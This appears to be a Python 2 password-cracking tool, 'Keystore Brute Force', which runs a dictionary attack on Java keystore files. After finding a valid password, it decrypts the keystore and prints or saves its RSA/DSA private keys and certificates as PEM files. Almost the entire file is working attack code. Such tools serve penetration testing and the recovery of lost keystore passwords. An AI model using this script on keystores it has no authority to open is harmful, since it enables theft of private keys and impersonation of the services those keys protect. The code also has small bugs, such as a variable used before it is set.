#!/usr/bin/python
# -*- coding: utf-8 -*-

# Author: Felipe Molina de la Torre (@felmoltor)
# Date: 04/2015
# License: GPLv3
# Summary:  This script execute a dictionary attack against the typical java "keystore" files
#           Just provide the path to the keystore and the dictionary and will try to unlock
#           the keystore with all the password of the dictionary
# Changelog:
#    * 2019/02/26 (v1.1): Added -D flag to optionally dump the key store information.
#                    Fix bug that reported always no keys where found
#                    Print in the screen the invalid passwords 
#
#    * 2019/02/26 (v1.2): Separated -D flag into two flats (-P, -S).
#                    -P dumps the information of the keystore into the terminal
#                    -S dumps the information of the keystore into a file of the hard disk 

import os,re, sys, base64, textwrap
import jks
from optparse import OptionParser
from termcolor import colored
import datetime

VERSION="1.2"
OUTPUTDIR="./output" 
CURRENTOUT="%s/%s" % (OUTPUTDIR,str(int(datetime.datetime.now().strftime("%s")) * 1000))

def printBanner():
    print colored("======================================","blue","on_white")
    print colored("=      Keystore Brute Force v%s     =" % VERSION,"blue","on_white")
    print colored("= Author: Felipe Molina (@felmoltor) =","blue","on_white")
    print colored("======================================","blue","on_white")
    print

def getoptions():
    usage = "Usage: %prog [options]"
    parser = OptionParser(usage=usage)
    parser.add_option("-k", "--keystore",metavar="FILE",dest="keystore", help="Keystore to crack")
    parser.add_option("-K", "--keystore-list",metavar="FILE", dest="keystorefile", default=None, help="A file with a list of keystores to crack")
    parser.add_option("-P", "--print-dumps", action="store_true", dest="printdumps", default=False, help="If specified, the keystore information will be dumped in the terminal")
    parser.add_option("-S", "--save-dumps", action="store_true", dest="savedumps", default=False, help="Save dumps of the data to the output folder [default: False]")
    parser.add_option("-d", "--dictionary", default="dictionary.txt",dest="dictionary",help="Dictionary to use in the brute force")
    parser.add_option("-v", "--verbose", action="store_true", dest="verbose", default=False, help="Show password being tested [default: False]")
    (options,args) = parser.parse_args()
    return options

def print_pem(data, data_type):
    print "-----BEGIN %s-----" % data_type
    print "\r\n".join(textwrap.wrap(base64.b64encode(data), 64))
    print "-----END %s-----" % data_type

def save_pem(data, data_type, path):
    f = open(path,"w")
    keystr = '-----BEGIN %s-----\n' % data_type
    keystr += '\r\n'.join(textwrap.wrap(base64.b64encode(data), 64))
    keystr += '\r\n'
    keystr += '-----END %s-----' % data_type
    f.write(keystr)
        
def dumpInfo(ksname, data, data_type):
    # Print in the terminal
    if (options.printdumps):
        print_pem(data, data_type)
    # Save all the certificates on disk
    if (options.savedumps):
        # This function will save the dumped information from the keystores on the output directory
        if not os.path.exists(OUTPUTDIR):
            os.mkdir(OUTPUTDIR)
        if not os.path.exists(CURRENTOUT):
            os.mkdir(CURRENTOUT)
        savepath = "%s/%s" % (CURRENTOUT,re.sub("[^a-zA-Z\.\-]","_",ksname))
        if ("CERTIFICATE" in data_type):
            savepath += ".cer"
        else:
            savepath += ".pem" 
        # Save the dump
        save_pem(data, data_type, savepath)
        print colored("Dumped %s of JKS file %s on path '%s'" % (data_type,ksname,savepath), "blue")

def printStatus(prefix="Progress: ", iteration=0.0, total=100.0, decimals=1, length=80, suffix="Complete", fill='█',start=0,recalculateETA=False,lastseta="?pps, ETA: ?"):
    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
    filledLength = int(length * iteration // total)
    bar = fill * filledLength + '-' * (length - filledLength)
    # Every 1% of increase in the progress bar, calculate the ETA (avoid calculate on each iteration)
    seta = '?pps, ETA: ?'
    if recalculateETA:
        seta = getSpeedAdnETA(start,iteration,total)
    else:
        seta = lastseta 
        
    if options.verbose:
        # Print the password we are testing now
        bar = ('%s |%s| %s%% %s [%s]' % (prefix, bar, percent, suffix, seta))
    else:
        # Print only percentage and ETA
        bar = ('%s |%s| %s%% [%s]' % (prefix, bar, percent, seta))
    
    sys.stdout.write('\r%s' % bar)
    sys.stdout.flush()
    
    return seta

def getSpeedAdnETA(start,iteration,total):
    seconds_in_day = 86400
    seconds_in_hour = 3600
    seconds_in_minute = 60
    seta = ""
    secleft = 0
    minsleft = 0
    hoursleft = 0
    daysleft = 0
    
    currentepoch = int(datetime.datetime.now().strftime("%s"))
    runningsecs = (currentepoch - start)
    if (runningsecs > 0):
        passpersec = round((float(iteration)/float(runningsecs)),1)
        secleft = round(((total - iteration)/passpersec),1)
        # Change to days minutes and hours left
        eta = ""
        resto = secleft
        if resto > seconds_in_day:
            daysleft = int(resto/seconds_in_day)
            resto = resto%seconds_in_day
            eta += "%sd" % daysleft
        if resto > seconds_in_hour:
            hoursleft = int(resto/seconds_in_hour)
            resto = resto%seconds_in_hour
            eta += "%sh" % hoursleft
        if resto > seconds_in_minute:
            minsleft = int(resto/seconds_in_minute)
            resto = resto%seconds_in_minute
            eta += "%sm" % minsleft
            
        eta += "%ss" % int(resto)
        
        seta = '%spps, ETA: %s' % (passpersec,eta)
    else:
        seta = '?pps, ETA: ?'
    return seta
        

def dictionaryAttack(kspath,dictionary):
    foundpwd=False
    NotValidFile=False
    startepoch = int(datetime.datetime.now().strftime("%s"))
    
    df = open(dictionary,"r")
    msg="= Brute forcing keystore file '%s' =" % kspath
    print colored("="*len(msg),"cyan")
    print colored(msg,"cyan")
    print colored("="*len(msg),"cyan")
    dictines = df.readlines()
    npassw=len(dictines)
    cpassw=0
    lseta = "?pps, ETA: ?" 
    
    for passw in dictines:
        cpassw+=1
        passw=passw.strip()
        # If current password number is module of 1% increase on the percentage bar, recalculate the ETA
        reta = False
        if ((cpassw%int((npassw*0.01))) == 0):
            reta = True
        
        nseta = printStatus(iteration=cpassw, total=npassw, suffix="Testing %s" % passw,start=startepoch,recalculateETA=reta,lastseta=lseta)
        lseta = nseta
        
        try:
            ks = jks.KeyStore.load(kspath, passw, try_decrypt_keys=True)
            sys.stdout.write("\n [+] Valid password found: ")
            print colored("%s" % passw,"green")
            print ""
            foundpwd=True
            ksname = os.path.basename(kspath)
            dumpKeyStore(ksname,ks)
            
        except jks.util.KeystoreSignatureException as e:
            continue
                
        except jks.util.BadKeystoreFormatException as e:
            print "\nError opening (%s): The file is not a Java Key Store. Skipping" % ksname
            NotValidFile=True
            break
        
        except UnicodeDecodeError as ue:
            if options.verbose:
                print "\nError. Tried password is not ASCII encoded. Skipping this password"
        
        if foundpwd:
            break
    if foundpwd == False and NotValidFile == False:
        print colored("\n\nA valid password couln't be found :-(","red") 

def dumpKeyStore(ksname,ks):
    
    print "********* START - DUMPED PRIVATE KEYs *********"
    for kalias in ks.private_keys.keys():
        sys.stdout.write(colored(" [i]", "grey"))
        print " Private Key Entry Alias: %s" % kalias
        pk = ks.private_keys[kalias]
        if not pk.is_decrypted():
            pk.decrypt()
        try:
            # ASN1 OID List: http://www.umich.edu/~x509/ssleay/asn1-oids.html 
            alg_oid_str = ".".join(map(str,pk.algorithm_oid))
            if alg_oid_str == "1.2.840.10040.4.1":
                dumpInfo(ksname,pk.pkey,"DSA PRIVATE KEY")
            elif alg_oid_str == "1.2.840.113549.1.1.1":
                dumpInfo(ksname,pk.pkey, "RSA PRIVATE KEY")
            else:
                dumpInfo(ksname,pk.pkey, "UNKNOWN PRIVATE KEY FORMAT (OID %s)" % alg_oid_str)
        except Exception:
            print "There was a problem accessing to the private key"
    print "********* END - DUMPED PRIVATE KEY *********\n"
    
    print "********* BEGIN - DUMPED PRIVATE KEYS CERTIFICATES *********"
    for c in pk.cert_chain:
        dumpInfo(ksname,c[1], "CERTIFICATE")
        print
    print "********* END - DUMPED PRIVATE KEYS CERTIFICATES *********\n"

    print "********* BEGIN - DUMPED KEY STORE CERTIFICATES *********"
    for cername in ks.certs:
        c = ks.certs[cername]
        sys.stdout.write(colored("[i]", "grey"))
        print " Certificate name: %s" % cername
        dumpInfo(ksname,c.cert, "CERTIFICATE")
        print  
    print "********* END - DUMPED KEY STORE CERTIFICATES *********\n"

# ======== #
# = MAIN = #
# ======== #

printBanner()
options = getoptions()

if options.keystorefile is not None:
    kslistf = open(options.keystorefile,"r")
    for kspath in kslistf.readlines():
        kspath=kspath.strip()
        if os.path.exists(kspath):
            dictionaryAttack(kspath,options.dictionary)
        else:
            print colored("Error. File %s does not exists. Skipping." % kspath,"red")
elif options.keystore is not None:
    dictionaryAttack(options.keystore,options.dictionary)
else:
    print "Error. Provide a keystore file name or a keystore list"
    exit(1)


